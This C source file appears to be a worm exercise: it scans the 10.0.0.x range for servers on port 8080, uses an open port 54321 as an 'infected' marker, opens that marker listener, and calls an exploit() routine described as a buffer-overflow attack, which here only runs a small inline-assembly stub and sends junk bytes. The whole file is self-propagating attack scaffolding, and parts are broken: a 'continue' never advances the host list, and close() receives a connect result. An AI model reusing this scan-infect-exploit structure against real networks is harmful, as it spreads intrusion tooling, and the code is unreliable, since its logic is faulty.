#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define SERVER_PORT 8080
#define INFECT_PORT 54321

// Structure for individual server cells in the linked list
struct cell_server {
    unsigned long IP;
    struct cell_server *Suivant;
};

// Structure defining the server list
struct list_server {
    struct cell_server *Debut;
    struct cell_server *Fin;
};

// Initialize the list structure
void Init_List(struct list_server *input){ 
    input->Debut = NULL;
    input->Fin = NULL;
}

// Add a server to the beginning of the list
void Add_Beginning(struct list_server *list, unsigned long address){
    // Allocate memory for a new server cell
    struct cell_server *p_cell;
    p_cell = malloc(sizeof(struct cell_server));
    p_cell->IP = address;

    // If the list is empty, set the new cell as both the start and end
    if (list->Debut == NULL && list->Fin == NULL){
        list->Debut = p_cell;
        list->Fin = p_cell;
        list->Debut->Suivant = NULL;
        list->Fin->Suivant = NULL;
    } else {
        // Otherwise, add the new cell to the beginning of the list
        struct cell_server *aux = list->Debut;
        list->Debut = p_cell;
        list->Debut->Suivant = aux;
    }
}

// Print the contents of the server list
void print_list(struct list_server *list){
    struct cell_server *aux = list->Debut;
    while(aux != NULL){
        printf("%022lx ----> ", aux->IP);
        aux = aux->Suivant;
    }
    printf("NULL\n");
}

// Free memory occupied by the server list
void free_list(struct list_server *list){
    struct cell_server *aux = list->Debut;
    while(aux != list->Fin){
        aux = aux->Suivant;
        free(list->Debut);
        list->Debut = aux;
    }
}

// Check if a server is infected
int is_infected(unsigned long ip, int sock, struct sockaddr_in *my_server_addr){
    my_server_addr->sin_addr.s_addr = ip;
    my_server_addr->sin_port = htons(INFECT_PORT);
    int connfd = connect(sock, (struct sockaddr*)my_server_addr, sizeof(*my_server_addr));
    if (connfd == 0){
        close(connfd);
        my_server_addr->sin_port = htons(SERVER_PORT);
        return 1;
    } else {
        my_server_addr->sin_port = htons(INFECT_PORT);
        return 0;
    }
}

// Function to infect servers, an infected server will have the arbitrary 54321 port opened
int infect(){

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    char port[] = "54321";

    if (sockfd < 0) {
		printf("Error in connection.\n");
		exit(1);
	}
	
	struct sockaddr_in addr;

    addr.sin_family = AF_INET;
    addr.sin_port = htons(atoi(port));
    addr.sin_addr.s_addr = INADDR_ANY;


    if (bind(sockfd, (struct sockaddr *)&addr, sizeof(addr)) == -1) {
        perror("bind");
        return 1;
    }
        
    if (listen(sockfd, 5) == -1) {
        perror("listen");
        return 1;
    }

    if(fork() ==0){
        while (1) {
            int client_sock = accept(sockfd, NULL, NULL);
            if (client_sock == -1) {
                perror("accept");
                return 1;
            }
            close(client_sock);
        }
    }
    return 0;
}

// Scan for available servers in a given IP range
struct list_server * scan_server_available(char * start_IP_str, char * end_IP_str){
	int sockfd;
    struct sockaddr_in server_addr;
	unsigned long start_IP, end_IP, start_index, end_index;
	
	// Parse la premiere et derniere machine
	if(inet_pton(AF_INET,start_IP_str,&(start_IP)) != 1){
		printf("Invalid start IP\n");
		exit(-1);
	}
	if(inet_pton(AF_INET,end_IP_str,&(end_IP)) != 1){
		printf("Invalid end IP\n");
		exit(-1);
	};

	// Initialize List struct
	struct list_server * opened_servers;
	opened_servers = malloc(sizeof(struct list_server));
	Init_List(opened_servers);



	start_index= ((start_IP & (0xFF<<24))>>24)&0xFF; 
	end_index= ((end_IP & (0xFF<<24))>>24)&0xFF; 


	if (end_IP < start_IP){
		printf("End IP must be superior to start IP\n");
		exit(-1);
	}

    // Create a TCP socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("socket");
        exit(1);
    }

    // Set up the server address struct
    memset(&server_addr, 0, sizeof(server_addr));	
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);

	unsigned long aux;

	for(aux = ntohl(start_IP); aux<=ntohl(end_IP); aux++){
		
		
		// Change server's IP	
		server_addr.sin_addr.s_addr = htonl(aux);
		

		//printf("Scanning 0x%02lx . . . \n",aux);
		// Connect to the server
		if (connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
				continue;
			}
		else {		
			char s_addr_str[INET_ADDRSTRLEN];
			inet_ntop(AF_INET,&(server_addr.sin_addr),s_addr_str, INET_ADDRSTRLEN);
			Add_Beginning(opened_servers,server_addr.sin_addr.s_addr);
			close(sockfd);
		}
	
	}
	printf("Here are the ulong corresponding to opened servers : \n");
	print_list(opened_servers);
	return opened_servers;
}

// Exploit the given buffer overflow vulnerability on a given server
void exploit(int connfd){
	// Perform a write to stdout
	asm("push %rsi\n\t"
	"lea (%rip),%rsi\n\t"
	"jmp 1f\n\t"
	".byte 65\n\t"
	".byte 69\n\t"
	".byte 65\n\t"
	".byte 65\n\t"
	"1:\n\t"
	"add $2,%rsi\n\t"
    "xor %rax, %rax\n\t"
    "mov $1, %al\n\t"
    "mov %rax, %rdi\n\t"
    "mov %rdi, %rdx\n\t"
    "add $5, %rdx\n\t"
    "syscall\n\t"
	"pop %rsi\n\t");
	char * buff[5];
	int SERV_BUFF_SIZE = 49;
	write(connfd,buff,5);
}


// Entry point of the program
int entry_point() {
    // Function where the main tasks are executed

    // Scan IP range for servers and store them in a linked list
    char *start = "10.0.0.1";
    char *end = "10.0.0.255";
    struct list_server *my_list;
    my_list = scan_server_available(start, end);

    // Create and initialize socket
    int my_sockfd;
    struct sockaddr_in my_server_addr;
    my_sockfd = socket(AF_INET, SOCK_STREAM, 0);
    memset(&my_server_addr, 0, sizeof(my_server_addr));    
    my_server_addr.sin_family = AF_INET;
    my_server_addr.sin_port = htons(SERVER_PORT);

    // Loop through vulnerable servers
    struct cell_server *current;
    current = my_list->Debut;
    while(current != NULL){
        // Check if the server has been infected before
        if (is_infected(current->IP, my_sockfd, &my_server_addr)){
            continue;
        } else {
            // Set up a client connection and launch exploit
            my_server_addr.sin_addr.s_addr = current->IP;
            int connfd;
            connfd = connect(my_sockfd, (struct sockaddr*)&my_server_addr, sizeof(my_server_addr));
            if (connfd >= 0){
                exploit(connfd);
            }
        }
        current = current->Suivant;
    }
    return 0;
}

// Main function
int main(int argc, char *argv[]) {
    // Call entry_point function where every task is executed
    entry_point();
    return 0;
}
	
